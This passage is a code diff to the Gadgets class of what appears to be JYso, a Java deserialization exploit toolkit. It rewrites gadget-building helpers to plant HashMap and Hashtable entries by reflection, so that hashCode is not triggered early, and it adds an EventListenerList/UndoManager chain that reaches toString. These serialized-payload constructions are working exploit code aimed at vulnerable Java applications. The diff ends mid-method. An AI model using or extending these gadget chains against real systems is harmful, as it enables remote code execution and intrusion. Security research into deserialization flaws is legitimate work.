@@ -7,14 +7,13 @@ import javassist.ClassClassPath;
 import javassist.CtClass;
 import javassist.CtConstructor;
 
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
-import java.util.Base64;
-import java.util.HashMap;
-import java.util.Hashtable;
-import java.util.Map;
+import java.util.*;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
 import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
@@ -302,34 +301,81 @@ public class Gadgets extends ClassLoader {
         return defineClass(name, bytecode, 0, bytecode.length);
     }
     public static Hashtable makeTableTstring(Object o) throws Exception{
+        Class node = Class.forName("java.util.HashMap$Node");
+        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
+        constructor.setAccessible(true);
+        // 避免put时触发hashcode
         Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
         Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        tHashMap1.put(o,"Unam4");
-        tHashMap2.put(o,"SpringKill");
+        Object tnode1 = constructor.newInstance(0, o,null, null);
+        Reflections.setFieldValue(tHashMap1, "size", 2);
+        Object tarr = Array.newInstance(node, 2);
+        Array.set(tarr, 0, tnode1);
+        Array.set(tarr, 1, tnode1);
+        Reflections.setFieldValue(tHashMap1, "table", tarr);
+        Object tnode2 = constructor.newInstance(0, o, null, null);
+        Reflections.setFieldValue(tHashMap2, "size", 2);
+        Object tarr2 = Array.newInstance(node, 2);
+        Array.set(tarr2, 0, tnode2);
+        Array.set(tarr2, 1, tnode2);
+        Reflections.setFieldValue(tHashMap2, "table", tarr2);
+
         Reflections.setFieldValue(tHashMap1,"loadFactor",1);
         Reflections.setFieldValue(tHashMap2,"loadFactor",1);
 
         Hashtable hashtable = new Hashtable();
-        hashtable.put(tHashMap1,"Unam4");
-        hashtable.put(tHashMap2,"SpringKill");
+        Reflections.setFieldValue(hashtable,"count",2);
+        Class<?> nodeE;
+        nodeE = Class.forName("java.util.Hashtable$Entry");
 
-        tHashMap1.put(o, null);
-        tHashMap2.put(o, null);
+        Constructor<?> nodeEons = nodeE.getDeclaredConstructor(int.class, Object.class, Object.class, nodeE);
+        nodeEons.setAccessible(true);
+        Object tbl = Array.newInstance(nodeE, 2);
+        Array.set(tbl, 0, nodeEons.newInstance(0, tHashMap1, "Unam4", null));
+        Array.set(tbl, 1, nodeEons.newInstance(0, tHashMap2, "Springkill", null));
+        Reflections.setFieldValue(hashtable, "table", tbl);
+//        hashtable.put(tHashMap1,"Unam4");
+//        hashtable.put(tHashMap2,"SpringKill");
+
+//        tHashMap1.put(o, null);
+//        tHashMap2.put(o, null);
         return hashtable;
     }
+
+    public static EventListenerList eventtostring(Object o) throws Exception{
+        EventListenerList list = new EventListenerList();
+        UndoManager manager = new UndoManager();
+        Vector vector = (Vector) Reflections.getFieldValue(manager, "edits");
+        vector.add(o);
+        Reflections.setFieldValue(list, "listenerList", new Object[] { Map.class, manager });
+        return list;
+    }
+
     public static HashMap maskmapToString(Object o1, Object o2) throws Exception{
-        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        tHashMap1.put(o1,null);
-        tHashMap2.put(o2,null);
-        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
-        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
-        HashMap hashMap = new HashMap();
         Class node = Class.forName("java.util.HashMap$Node");
         Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
         constructor.setAccessible(true);
-        Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
-        Object node2 = constructor.newInstance(0, tHashMap2, "SpringKill", null);
+        //避免put时触发hashcode
+        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Object tnode1 = constructor.newInstance(0, o1,null, null);
+        Reflections.setFieldValue(tHashMap1, "size", 1);
+        Object tarr = Array.newInstance(node, 1);
+        Array.set(tarr, 0, tnode1);
+        Reflections.setFieldValue(tHashMap1, "table", tarr);
+        Object tnode2 = constructor.newInstance(0, o2, null, null);
+        Reflections.setFieldValue(tHashMap2, "size", 1);
+        Object tarr2 = Array.newInstance(node, 1);
+        Array.set(tarr2, 0, tnode2);
+        Reflections.setFieldValue(tHashMap2, "table", tarr2);
+//        tHashMap1.put(o1,null);  避免触发hashcode
+//        tHashMap2.put(o2,null);  避免触发hashcode
+
+        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
+        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
+        HashMap hashMap = new HashMap();
+        Object node1 = constructor.newInstance(0, tHashMap1, null, null);
+        Object node2 = constructor.newInstance(0, tHashMap2, null, null);
         Reflections.setFieldValue(hashMap, "size", 2);
         Object arr = Array.newInstance(node, 2);
         Array.set(arr, 0, node1);
